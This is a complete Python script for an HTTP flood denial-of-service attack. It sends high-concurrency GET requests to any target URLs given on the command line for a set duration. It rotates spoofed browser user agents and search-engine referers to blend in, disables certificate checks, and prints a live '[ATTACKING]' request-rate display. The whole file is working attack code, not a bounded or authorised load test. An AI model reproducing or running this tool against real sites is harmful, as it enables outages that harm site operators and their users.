import asyncio
import aiohttp
import random
import time
import argparse
import sys
import os

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
]

class Stats:
    def __init__(self):
        self.requests = 0
        self.success = 0
        self.failed = 0
        self.start_time = time.time()

    def rps(self):
        elapsed = time.time() - self.start_time
        return self.requests / elapsed if elapsed > 0 else 0

async def send_request(session, target_url, stats):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
    }
    try:
        async with session.get(target_url, headers=headers, timeout=10) as response:
            stats.requests += 1
            if response.status < 400:
                stats.success += 1
            else:
                stats.failed += 1
    except Exception:
        stats.requests += 1
        stats.failed += 1

async def worker(target_url, concurrency, duration, stats):
    connector = aiohttp.TCPConnector(limit=None, ssl=False, use_dns_cache=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        end_time = time.time() + duration
        while time.time() < end_time:
            tasks = [send_request(session, target_url, stats) for _ in range(min(concurrency, 100))]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.01)

async def monitor(stats, duration, target_url):
    end_time = time.time() + duration
    while time.time() < end_time:
        elapsed = time.time() - stats.start_time
        print(f"\r[ATTACKING] {target_url} | Req: {stats.requests} | OK: {stats.success} | ERR: {stats.failed} | RPS: {stats.rps():.2f}", end="")
        await asyncio.sleep(1)
    print("\n[INFO] Finished.")

async def run_attack(target_url, concurrency, duration):
    stats = Stats()
    print(f"[START] Target: {target_url}")
    await asyncio.gather(
        worker(target_url, concurrency, duration, stats),
        monitor(stats, duration, target_url)
    )

async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("targets", nargs="+")
    parser.add_argument("-c", type=int, default=500)
    parser.add_argument("-d", type=int, default=60)
    args = parser.parse_args()

    for target in args.targets:
        if not target.startswith("http"): target = "http://" + target
        await run_attack(target, args.c, args.d)

if __name__ == "__main__":
    asyncio.run(main())
